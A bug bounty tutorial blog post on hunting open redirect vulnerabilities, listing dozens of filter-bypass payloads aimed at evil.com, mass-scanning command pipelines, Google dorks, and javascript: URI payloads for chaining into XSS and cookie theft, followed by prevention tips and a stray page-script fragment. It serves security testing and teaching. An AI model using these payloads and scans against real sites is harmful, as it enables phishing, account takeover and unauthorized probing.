---
title: 'From Zero to Hero: Hunting High-Paying Open Redirect Bugs in Web Apps'
subtitle: Step-by-Step Guide to Master Open Redirect Bugs and Earn High-Paying Bounties
tags:
- Bug Bounty
- Bug Bounty Tips
- Cybersecurity
- Penetration Testing
- Bug Bounty Writeup
published: '2025-03-20'
updated: '2025-09-23'
free: false
freedium_url: https://freedium-mirror.cfd/https://infosecwriteups.com/from-zero-to-hero-hunting-high-paying-open-redirect-bugs-in-web-apps-fdb80286236e
source_url: https://infosecwriteups.com/from-zero-to-hero-hunting-high-paying-open-redirect-bugs-in-web-apps-fdb80286236e
---

# From Zero to Hero: Hunting High-Paying Open Redirect Bugs in Web Apps

*Step-by-Step Guide to Master Open Redirect Bugs and Earn High-Paying Bounties*

*Published Mar 20, 2025 · Updated Sep 23, 2025 · Free: No*

### **Introduction**

Open Redirect vulnerability is a common security flaw that allows attackers to redirect users to malicious websites. This vulnerability occurs when a web application accepts user input for URLs without proper validation or control. As simple as it sounds this flaw can lead to serious consequences like phishing, malware distribution and session hijacking.

#### **Understanding Open Redirect Basics**

If the server blindly accepts the user supplied URL and redirects without checks it becomes an open redirect vulnerability. By modifying the url parameter attackers can trick users into visiting harmful sites like this:

```bash
https://example.com/redirect?url=http://malicious.com
```

In this scenario the attacker manipulates the URL parameter to redirect the user to a malicious site under their controlled domain.

### **Manual Testing Techniques**

**1. Simply Change the Domain**

```bash
?redirect=https://example.com → ?redirect=https://evil.com
```

**2. Bypass When Protocol is Blacklisted**

```bash
?redirect=https://example.com → ?redirect=//evil.com
```

**3. Bypass When Double Slash is Blacklisted**

```bash
?redirect=https://example.com → ?redirect=\\evil.com
```

**4. Bypass Using http: or https:**

```bash
?redirect=https://example.com → ?redirect=https:example.com
```

**5. Bypass Using %40 (At Symbol Encoding)**

```text
?redirect=example.com → ?redirect=example.com%40evil.com
```

**6. Bypass if Only Checking for Domain Name**

```text
?redirect=example.com → ?redirect=example.comevil.com
```

**7. Bypass Using Dot Encoding %2e**

```text
?redirect=example.com → ?redirect=example.com%2eevil.com
```

**8. Bypass Using a Question Mark**

```text
?redirect=example.com → ?redirect=evil.com?example.com
```

**9. Bypass Using Hash %23**

```text
?redirect=example.com → ?redirect=evil.com%23example.com
```

**10. Bypass Using a Symbol**

```text
?redirect=example.com → ?redirect=example.com/evil.com
```

**11. Bypass Using URL Encoded Chinese Dot %E3%80%82**

```text
?redirect=example.com → ?redirect=evil.com%E3%80%82%23example.com
```

**12. Bypass Using a Null Byte %0d or %0a**

```text
?redirect=/ → ?redirect=/%0d/evil.com
```

13. Encoded URL Redirects

```text
https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
```

14. Path-Based Redirects

```bash
https://example.com/redirect/http://malicious.com
```

15. Data URI Redirects

```text
https://example.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==
```

16. JavaScript Scheme Redirects

```text
https://example.com/redirect?url=javascript:alert('XSS');//
```

17. Open Redirect via HTTP Header

```makefile
Location: http://malicious.com
X-Forwarded-Host: evil.com
Refresh: 0; url=http://malicious.com
```

18. **Path Traversal Hybrids**

```bash
/redirect?url=/../../https://evil.com
```

19. **Using svg paylaod**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg>
```

**20. Case-sensitive Variations**

```text
//GOOGLE.com/ → Bypass on case-sensitive filters
//GoOgLe.com/ → Random casing to evade blacklists
```

**21. Trailing Special Characters**

```text
//google.com/#/ → Fragment to obscure final redirect
//google.com/;&/ → Extra characters after domain
//google.com/?id=123&// → Obfuscated with trailing ampersands
```

**22. IP Address Variants**

```text
http://3232235777 → Decimal IP for 192.168.1.1
http://0xC0A80001 → Hexadecimal IP
http://192.168.1.1/ → Normal IP address
```

**23. IPv6 Notation**

```text
http://[::1]/ → IPv6 loopback
http://[::ffff:192.168.1.1]/ → IPv4-mapped IPv6
```

**24. Non-standard Ports**

```text
http://google.com:81 → Different port used
https://google.com:444 → May bypass filters by port
```

**25. Unicode Obfuscation in Paths**

```text
/%E2%80%http://8Egoogle.com → Unicode injection
/%C2%http://A0google.com → More unicode obfuscation

```

### **Automated Tools for Scanning**

#### Reconnaissance

Collect multiple active and passive URLs from all available tools and sources.

> **For single domain:**

```bash
echo target.com | gau --o urls1.txt
echo target.com | katana -d 2 -o urls2.txt
echo target.com | urlfinder -o urls3.txt
echo target.com | hakrawler > urls4.txt
```

> **For multiple subdomains:**

```text
subfinder -d target.com -all -o subdomains1.txt
assetfinder --subs-only target.com > subdomains2.txt
sort -u subdomains.txt subdomains2.txt -o uniqsubs.txt
cat uniqsubs.txt | httpx-toolkit -o finallist.txt

cat finallist.txt | gau --o urls1.txt
cat finallist.txt | katana -d 2 -o urls2.txt
cat finallist.txt | urlfinder -o urls3.txt
cat finallist.txt | hakrawler > urls4.txt

```

After collecting all the URLs its time to filter out duplicates and sort them.

```text
cat urls1.txt urls2.txt urls3.txt | uro | sort -u | tee final.txt
```

#### Filtering URLs for Redirect Parameters

Using the grep command to filter out all open redirect parameters used for redirections:

```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
```

A more effective approach is to use the gf tool pattern to filter only open redirect parameters with the following command:

```bash
final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
```

[**GFpattren/redirect.json at main · coffinxp/GFpattren**](https://github.com/coffinxp/GFpattren/blob/main/redirect.json)
*Contribute to coffinxp/GFpattren development by creating an account on GitHub.*

Now its time for the final exploitation phase. Lets identify potential payloads and test for successful redirections

```bash
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

Or you can also achieve same using the following method:

```python
subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```


It will display all the URLs that redirect to evil.com on the screen.

To scan for all open redirect bypass payloads from my custom list use the following command:

```bash
cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```


This command will test all the custom open redirect bypass payloads from my or.txt list against each URL parameter. If any redirection to Google is detected in the response it will be displayed on the screen.

Or you can also achieve same results using the following method for single and multiple target domains:

```bash
 echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

### Fuzzing with FFuF and Verifying in Burpsuite

```bash
ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=PAYLOAD" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"
```

- -mc : Match only 301,302,303,307,308 redirect responses.
- -mr : Confirm redirect to a malicious domain "Location: http://google.com"
- -x: This option is used to proxy FFUF traffic through Burp Suite for manual testing.
- -w for wordlist: redirect_param.txt contains all openredirect params and or.txt file contains all openredirect bypass paylaods


After capturing FFUF traffic in Burp Suite, you can use the filter option to display only the 300 series status codes.

for more better filtering you can use burp search option to check only google.com url in response header for more acurate results:


You can also use CURL tool for mass open redirect testing with the following command:

```bash
 cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
```


### Testing Using Nuclei Template

You can also use this custom private Nuclei template that automatically appends parameters to subdomain URLs and checks for open redirects.

```bash
echo subdomains.txt | nuclei -t openRedirect.yaml -c 30
```


### Using virustotal

You can also use VirusTotal to find URLs with open redirect parameters and test them with the above methods.

```bash
https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com
```


```bash
./virustotal.sh domains.txt | gf redirect
```


After this you can use the same methods like qsreplace,ffuf,httpx and Burp Suite for further testing.

### Using Burpsuite

You can also use Burp Suite to find open redirect vulnerabilities with the following methods:

> **step 1**

Intercept the target response in Burp Suite and send it to "Discover Content" for active crawling on the target domain.


> **step 2**

After crawling you'll find numerous URLs with parameters in the Target tab.


> **step 3**

After this filter all the responses to only 300-series status codes, pick one redirect parameter and send it to the Repeater tab.


> **step 4**

And now add the parameter position where you want to fuzz all open redirect bypass payloads. You can find the list in my GitHub repo:

[**loxs/payloads/or.txt at main · coffinxp/loxs**](https://github.com/coffinxp/loxs/blob/main/payloads/or.txt)
*best tool for finding SQLi,CRLF,XSS,LFi,OpenRedirect - loxs/payloads/or.txt at main · coffinxp/loxs*

Now start the attack. Make sure auto URL encoding is disabled and you can add google.com or any site you want to check in Response Matching.


> **step 5**

Now use the Filter option to view only 300-series status codes in the response. Here you'll find all the redirections on the target. Also make sure to check the response length for more accurate results.


Now you can copy any request and paste it into the browser to verify the redirection.

### Using Loxs tool

For a simpler way to find open redirects you can use our Loxs tool which automatically detects open redirects without any false positives. Use the following command first:

```bash
cat urls.txt | sed 's/=.*/=/' | uro >final.txt
```

- urls.txt: A file containing URLs that have been filtered and sorted using gf patterns or other methods.
- The sed command is used to extract all parameters from URLs and convert them into empty parameters for fuzzing.

After this send the final.txt file into the Loxs tool, select the open redirect option, choose the urls.txt file and select the payload file after that The result will look like this:


And Loxs will also generate an HTML file for easy viewing of the results, showing all the successful open redirect payloads in a clean and organized format.


### Openredirect to XSS(ATO)

If you find any open redirect, always try to increase the impact by chaining it with XSS by using following paylaods:

```yaml
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
```

[**Lab: Stealing OAuth access tokens via an open redirect | Web Security Academy**](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
*This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth…*

### Google Dorking & Automation

You can also use the manual method to find open redirects on your target using this Google Dork:

```php
site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target
```

For mass open redirect automation, you can use my dorking.py script, which fetches all Google Dork results within seconds on the terminal


After this use gf patterns,qsreplace and httpx grep to filter valid open redirects with the following command:

```bash
cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```


For testing more advanced bypass payloads rather than simple ones use this command to try all bypass payloads from my custom wordlist:

```bash
cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```


Or you can also use the Loxs tool in the same way as before. First trim all parameters then send the file to Loxs. It will automatically detect all open redirects.

### **Risks and Impacts**

- **Phishing Attacks**: Users are tricked into entering credentials on fake websites.
- **Malware Distribution**: Redirecting to sites that automatically download malware.
- **Session Hijacking**: Stealing session cookies through crafted URLs.

### How to Prevent

Here's how you can secure your website from open redirects:

- **Whitelist URLs**: Restrict redirection to trusted domains only.
- **Use Relative Paths:** Ditch full URLs for safer relative paths.
- **Validate Inputs**: Block any unknown or suspicious redirect values.
- **Show Warnings**: Notify users before redirecting them to external websites.

### 💵 Bug Bounty Payouts

- **Small Websites**: $50 — $200
- **Mid-Sized Companies**: $200 — $500
- **Big Corporations:** $500 — $1000
- **Open Redirect to ATO** $1000 — $5000

**You can also watch this video where I showed the complete practical of this method:**

console.log(&quot;[FREEDIUM] iframe workaround started&quot;);
}
if (!event.data || (typeof event.data != 'string')) {
return false;
}
var data;
try {
data = JSON.parse(event.data);
} catch (e) {
console.error(e);
return false;
}
var iframe = document.querySelector('iframe');
if (!iframe || !(data.type === 'MEASURE' || data.context === 'iframe.resize')) {
return false;
}
notifyResize(data.height || data.details.height);
</body></html>"></iframe>

### **Conclusion**

Open Redirect vulnerabilities remain a critical threat to web application security. By understanding the technical aspects, detection methods, and prevention strategies, developers and security researchers can effectively mitigate the risks.

### Disclaimer

> _The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly_
